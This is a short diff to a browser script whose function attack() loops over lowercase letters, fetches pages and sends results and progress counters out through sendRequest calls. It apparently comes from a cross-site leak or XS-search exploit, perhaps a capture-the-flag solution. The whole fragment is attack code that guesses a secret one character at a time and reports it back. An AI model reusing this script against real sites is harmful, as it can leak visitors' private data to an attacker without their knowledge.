@@ -33,7 +33,9 @@ async function attack() {
         let j = 0;
         while (j < lowercase_letters.length) {
             const l = lowercase_letters[j];
-            
+            if (i % 1000 == 0) {
+                sendRequest("id="+i);
+            }
             try {
                 await new Promise((resolve, reject) => {
                     //fetch page
@@ -66,4 +68,5 @@ async function attack() {
     sendRequest("result=false");
 }
 attack();
+
 </script>
